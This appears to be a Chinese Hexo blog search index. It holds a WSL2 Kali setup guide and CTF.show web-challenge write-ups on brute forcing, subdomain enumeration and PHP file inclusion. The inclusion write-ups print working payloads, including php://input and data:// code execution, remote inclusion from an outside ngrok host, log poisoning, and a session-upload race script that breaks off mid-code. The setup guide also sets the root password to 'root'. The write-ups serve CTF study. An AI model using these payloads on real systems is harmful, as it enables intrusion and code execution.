<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>windows下的wsl-kail</title>
      <link href="/Linux/%E5%85%B6%E4%BB%96/wsl-kail/"/>
      <url>/Linux/%E5%85%B6%E4%BB%96/wsl-kail/</url>
      
        <content type="html"><![CDATA[<h1 id="wsl2下的kali环境"><a href="#wsl2下的kali环境" class="headerlink" title="wsl2下的kali环境"></a>wsl2下的kali环境</h1><p>首先在微软自带的应用商店安装Windows 终端</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511175649558.png" alt="image-20220511175649558"></p><p>接着我们对Windows 终端进行基本的设置,启动默认为powershell</p><p>使用父进程目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220512225608539.png" alt="image-20220512225608539"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220512225432640.png" alt="image-20220512225432640"></p><p>修改一下后背景图片</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220512225550447.png" alt="image-20220512225550447"></p><p>接着我们修改一下.bat文件的默认打开方式,打开注册表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">计算机\HKEY_CLASSES_ROOT\batfile\shell\open\command</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220513103044730.png" alt="image-20220513103044730"></p><p>修改成wt.exe的路径加上后面的参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.12.10982.0_x64__8wekyb3d8bbwe\wt.exe&quot;  -p &quot;Command Prompt&quot; &quot;%1&quot; %*</span><br></pre></td></tr></table></figure><p>这样的话我们新建一个bat文件来在sqlmap.py目录下面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220513103146500.png" alt="image-20220513103146500"></p><p>我们来双击这个bat文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220513103638403.png" alt="image-20220513103638403"></p><p>太好玩了</p><p>接着打开适用于linux的windows子系统</p><p>控制面板-&gt;程序-&gt;启动或者关闭windows功能</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511180137676.png" alt="image-20220511180137676"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511175823927.png" alt="image-20220511175823927"></p><p>接着重启电脑</p><p>打开任务管理器看看有没有开启虚拟化</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511175925628.png" alt="image-20220511175925628"></p><p>windows powershell管理员开启</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</span><br><span class="line"></span><br><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br><span class="line"></span><br><span class="line">dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --install</span><br><span class="line">wsl --status</span><br><span class="line">wsl --update</span><br><span class="line">wsl --set-default-version 2</span><br></pre></td></tr></table></figure><p>安装linux,还是应用商店</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511180456369.png" alt="image-20220511180456369"></p><p>安装完成后，在 Kali Linux 下，输入如下命令，安装工具集</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt upgrade</span><br><span class="line">sudo apt install -y kali-linux-default</span><br></pre></td></tr></table></figure><p>安装gui</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install -y kali-win-kex</span><br></pre></td></tr></table></figure><p>开启</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启动</span><br><span class="line">cd ~</span><br><span class="line">kex</span><br><span class="line"># 关闭</span><br><span class="line">kex stop</span><br><span class="line"># 窗口模式</span><br><span class="line">kex --win -s</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511180629831.png" alt="image-20220511180629831"></p><p>还可以开启无缝模式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kex --sl -s</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511180740001.png" alt="image-20220511180740001"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511180956711.png" alt="image-20220511180956711"></p><p>修改任务栏位置</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511181027493.png" alt="image-20220511181027493"></p><p>分别为取消固定和修改长度</p><p>修改root密码为root</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -i 加本人登录时设置的密码</span><br><span class="line">passwd root root</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511180905990.png" alt="image-20220511180905990"></p><p>处理一个bug,截图找不到了,如果自配置用户启动出错,修改一下两个log文件的所属用户和所属组,并更改权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown wanan  win-kexsl_wanan.log</span><br><span class="line">chgrp wanan  win-kexsl_wanan.log</span><br><span class="line">chmod 644 win-kexsl_wanan.log</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220511181205713.png" alt="image-20220511181205713"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑盒测试</title>
      <link href="/ctfshow/ctf.show/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
      <url>/ctfshow/ctf.show/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291618023.png" alt="image-20220329161843751"></p><p>扫扫目录,翻翻源码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291643206.png" alt="image-20220329164330178"></p><p>这是别人扫的,工具扫太快,扫不到.改天研究研究把速度调慢点</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291637313.png" alt="image-20220329163703212"></p><p>什么也没发现</p><p>不过看来是按page_1 2 3 4来读取的文件,我们试试别的试试page.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291647396.png" alt="image-20220329164722345"></p><p>发现是通过id参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291652437.png" alt="image-20220329165206218"></p><p>存在本地文件包含</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291652987.png" alt="image-20220329165228952"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291652964.png" alt="image-20220329165243903"></p><h1 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311957334.png" alt="image-20220331195729205"></p><p>找后台</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311958272.png" alt="image-20220331195808224"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爆破</title>
      <link href="/ctfshow/ctf.show/%E7%88%86%E7%A0%B4/"/>
      <url>/ctfshow/ctf.show/%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><h2 id="base64编码爆破"><a href="#base64编码爆破" class="headerlink" title="base64编码爆破"></a>base64编码爆破</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261832550.png" alt="image-20220326183208502"></p><p>抓包发现并没有使用get和post提交</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261831899.png" alt="image-20220326183101849"></p><p>发现一个basic 解码base64是密码<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261831179.png" alt="image-20220326183154126"></p><p>开始爆破,添加位置</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261919165.png" alt="image-20220326191936110"></p><p>选择用户自定义</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261920054.png" alt="image-20220326192020001"></p><p>在一填admin:</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261920828.png" alt="image-20220326192031782"></p><p>二加上刚才的字典</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261921853.png" alt="image-20220326192102803"></p><p>添加base64编码,取消下面的url编码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261921652.png" alt="image-20220326192124605"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261919007.png" alt="image-20220326191915961"></p><p>查看响应</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261922668.png" alt="image-20220326192208620"></p><h1 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h1><h2 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h2><p>扫一下百度吧,记录下工具</p><h2 id="ctfr"><a href="#ctfr" class="headerlink" title="ctfr"></a>ctfr</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python ctfr.py -d baidu.com</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312215476.png"></p><h2 id="oneforall"><a href="#oneforall" class="headerlink" title="oneforall"></a>oneforall</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python oneforall.py --targets baidu.com run</span><br></pre></td></tr></table></figure><h2 id="layer"><a href="#layer" class="headerlink" title="layer"></a>layer</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312221759.png" alt="image-20220331222123654"></p><h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;<span class="comment">#得到token</span></span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);<span class="comment">#对token进行MD5加密</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="comment">#截取token的第二位,如果等于token的第15位     并且token的第15位等于token的第18位</span></span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="comment">#截取到的token的第2位专换成数字+15位+18位的和除以第二位等于第32位的话就结束</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;0123456789qazwsxedcrfvtgbyhnujmikolp&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">36</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> =<span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="number">36</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span> = <span class="variable">$dir</span>[<span class="variable">$i</span>].<span class="variable">$dir</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$token</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">1</span>,<span class="number">1</span>) === <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">14</span>,<span class="number">1</span>)&amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">14</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">14</span>,<span class="number">1</span>)) + <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">1</span>,<span class="number">1</span>)) === <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>,<span class="number">31</span>,<span class="number">1</span>))))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$dir</span>[<span class="variable">$i</span>].<span class="variable">$dir</span>[<span class="variable">$j</span>];</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#3j</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011316155.png" alt="image-20220401131618105"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/ctfshow/ctf.show/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/ctfshow/ctf.show/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262039670.png" alt="image-20220326203913638"></p><p>源码开局</p><p><strong>php:&#x2F;&#x2F;</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><strong>data:&#x2F;&#x2F;</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php%20system(&#x27;cat `ls`&#x27;)?&gt;</span><br></pre></td></tr></table></figure><p><strong>php:&#x2F;&#x2F;</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://input</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">&lt;?php system(&#x27;tac `ls`&#x27;) ?&gt;</span><br></pre></td></tr></table></figure><p><strong>http</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://9eb3-111-17-194-91.ngrok.io/wanan.txt</span><br><span class="line">?file=https://9eb3-111-17-194-91.ngrok.io/wanan.txt</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262045074.png" alt="image-20220326204539032"></p><h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span class="line"></span><br><span class="line">/?file=PHP://input</span><br><span class="line">POST</span><br><span class="line">&lt;?php system(&#x27;tac `ls`&#x27;) ?&gt;</span><br><span class="line"></span><br><span class="line">http://0d236b1b-2f77-47ca-b3ac-be411c6f0441.challenge.ctf.show/?file=http://9eb3-111-17-194-91.ngrok.io/wanan.txt</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403203526578.png" alt="image-20220403203526578"></p><p>这里的%2b是加号,在我这里直接使用+号是不行的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301259325.png" alt="image-20220330125919158"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgYGxzYCcpID8%2b</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203301259631.png" alt="image-20220330125934546"></p><h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://9eb3-111-17-194-91.ngrok.io/wanan.txt</span><br><span class="line"></span><br><span class="line">/?file=PHP://input</span><br><span class="line">POST</span><br><span class="line">&lt;?php system(&#x27;tac `ls`&#x27;) ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403204127607.png" alt="image-20220403204127607"></p><h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-16 15:51:31</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>日志包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>接着修改ua</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403205128333.png" alt="image-20220403205128333"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403205420402.png" alt="image-20220403205420402"></p><h1 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h1><h2 id="利用session-upload-progress进行文件包含"><a href="#利用session-upload-progress进行文件包含" class="headerlink" title="利用session.upload_progress进行文件包含"></a>利用session.upload_progress进行文件包含</h2><p>在php.ini中有以下默认的配置</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#表示upload_progress功能开始,也意味着当浏览器向服务器上传一个文件是,php会把此次文件上传的详细信息(如上传时间 上传进度等)存储在session当中</span></span><br><span class="line"><span class="number">1</span>. session.upload_progress.enabled = on</span><br><span class="line"><span class="comment">#表示当文件上传结束后,php将会立即清除对应session文件中的内容,这个选项非常重要</span></span><br><span class="line"><span class="number">2</span>. session.upload_progress.cleanup = on</span><br><span class="line"><span class="comment">#prefix+name将表示为session中的键名</span></span><br><span class="line"><span class="number">3</span>. session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line"><span class="comment">#name当它出现在表单中,php将会报告上传进度,最大的好处是他的值可控</span></span><br><span class="line"><span class="number">4</span>. session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="number">5</span>. session.upload_progress.freq = <span class="string">&quot;1%&quot;</span></span><br><span class="line"><span class="number">6</span>. session.upload_progress.min_freq = <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="comment">#增配置的默认值为off,表示我们对cookie中的sessionid可控</span></span><br><span class="line"><span class="number">7</span>.session.use_strict_mode=off</span><br></pre></td></tr></table></figure><p>如果session.auto_start&#x3D;On,则php在接收请求的时候会自动初始化session,不在需要执行session_start().但是默认情况下这个选项都是关闭的.</p><p>但是session还有一个默认选项,session.use_strict_mode的默认值为0.此时用户是可以自定义session id的.比如,我们在cookie里设置phpsessid&#x3D;tgao,php将会在服务器上创建一个文件:&#x2F;tmp&#x2F;sess_TGAO 即使此时用户没有初始化session,php也会自动初始化session.并产生一个键值.这个键值由ini.get(“session.upload_progress.prefix”)+和由我们构造的session.upload_progress.name值组成,最后被写入sess_文件里.</p><p>默认配置session.upload_progress.cleanup&#x3D;on导致文件上传以后,session文件内容立即清空,这个时候我们就可以通过条件竞争来实现</p><p>session文件默认存储路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> author:lonmar</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span>     <span class="comment">#这里改为题目的url地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        response = session.post(                                            </span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#x27;</span>&#125;,       <span class="comment">#session中写入一句话</span></span><br><span class="line">            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, f)&#125;     <span class="comment">#写入文件</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.get(url + <span class="string">&#x27;?file=/tmp/sess_&#123;&#125;&#x27;</span>.<span 